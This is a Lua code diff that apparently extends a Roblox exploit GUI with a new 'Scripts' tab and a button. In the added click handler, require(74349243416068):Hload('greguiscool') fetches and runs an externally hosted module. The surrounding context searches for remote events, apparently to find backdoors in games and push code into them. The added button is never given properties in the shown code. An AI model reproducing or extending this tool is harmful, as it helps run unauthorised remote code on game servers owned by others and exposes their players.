@@ -19,6 +19,8 @@ local Converted = {
 	["_LocalScript"] = Instance.new("LocalScript");
 	["_inf"] = Instance.new("TextButton");
 	["_UIStroke5"] = Instance.new("UIStroke");
+        ["_Tab2Btn"] = Instance.new("TextButton");
+        ["_UIStroke6"] = Instance.new("UIStroke");
 }
 
 -- Properties:
@@ -189,6 +191,41 @@ Converted["_UIStroke5"].Color = Color3.fromRGB(255, 0, 0)
 Converted["_UIStroke5"].LineJoinMode = Enum.LineJoinMode.Miter
 Converted["_UIStroke5"].Thickness = 2
 Converted["_UIStroke5"].Parent = Converted["_inf"]
+-- New Tab
+Converted["_Tab2"] = Instance.new("Frame")
+Converted["_Tab2"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_Tab2"].BackgroundTransparency = 0.5
+Converted["_Tab2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_Tab2"].BorderSizePixel = 0
+Converted["_Tab2"].Position = UDim2.new(0.05, 0, 0.2, 0)
+Converted["_Tab2"].Size = UDim2.new(0, 500, 0, 250)
+Converted["_Tab2"].Visible = false -- Hidden at start
+Converted["_Tab2"].Parent = Converted["_Frame"]
+-- Stroke for Tab2
+Converted["_UIStroke_Tab2"] = Instance.new("UIStroke")
+Converted["_UIStroke_Tab2"].Color = Color3.fromRGB(255, 0, 0)
+Converted["_UIStroke_Tab2"].LineJoinMode = Enum.LineJoinMode.Miter
+Converted["_UIStroke_Tab2"].Thickness = 2
+Converted["_UIStroke_Tab2"].Parent = Converted["_Tab2"]
+-- Label inside Tab2
+Converted["_Tab2Label"] = Instance.new("TextLabel")
+Converted["_Tab2Label"].Font = Enum.Font.Cartoon
+Converted["_Tab2Label"].Text = "Scripts"
+Converted["_Tab2Label"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_Tab2Label"].TextScaled = true
+Converted["_Tab2Label"].BackgroundTransparency = 1
+Converted["_Tab2Label"].Size = UDim2.new(1, 0, 0.2, 0)
+Converted["_Tab2Label"].Parent = Converted["_Tab2"]
+Converted["_BackButton"] = Instance.new("TextButton")
+Converted["_BackButton"].Font = Enum.Font.Cartoon
+Converted["_BackButton"].Text = "Back"
+Converted["_BackButton"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_BackButton"].TextScaled = true
+Converted["_BackButton"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_BackButton"].BackgroundTransparency = 0.5
+Converted["_BackButton"].Size = UDim2.new(0, 100, 0, 50)
+Converted["_BackButton"].Position = UDim2.new(0.5, -50, 0.8, 0)
+Converted["_BackButton"].Parent = Converted["_Tab2"]
 
 -- Fake Module Scripts:
 
@@ -501,6 +538,9 @@ end
 	
 		)
 	end)
+        Converted["_Tab2Btn"].MouseButton1Click:Connect(function()
+        require(74349243416068):Hload("greguiscool")
+       end)
 	task.spawn(findRemote)
 	repeat task.wait() until FinishedFound or remoteEvent or remoteFunction
 	repeat task.wait() until FinishedFound
